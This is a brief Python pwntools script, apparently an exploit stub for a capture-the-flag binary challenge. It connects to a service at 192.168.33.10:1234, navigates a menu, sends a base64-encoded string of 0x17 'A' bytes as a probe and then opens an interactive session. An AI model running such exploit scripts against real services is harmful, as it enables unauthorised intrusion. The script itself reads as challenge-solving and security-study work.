from pwn import *

s = remote('192.168.33.10',1234)
def read(index,msg):
  s.recvuntil('Which?')
  s.sendline('1')
  s.recvuntil('Which?')
  s.sendline(str(index))
  s.recvuntil('msg:')
  s.sendline(msg)
raw_input()
read(0,("A"*0x17).encode('base64').replace('\n',''))
s.interactive()
